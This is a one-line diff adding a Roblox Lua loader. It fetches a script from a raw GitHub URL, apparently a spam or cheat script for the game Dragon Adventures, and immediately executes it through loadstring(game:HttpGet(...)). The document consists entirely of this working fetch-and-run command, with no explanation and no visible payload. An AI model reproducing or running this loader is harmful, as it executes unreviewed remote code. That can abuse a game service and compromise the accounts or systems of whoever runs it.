@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/dragon-adventures-spam2-449gxlwyoeeuo4.lua"))()
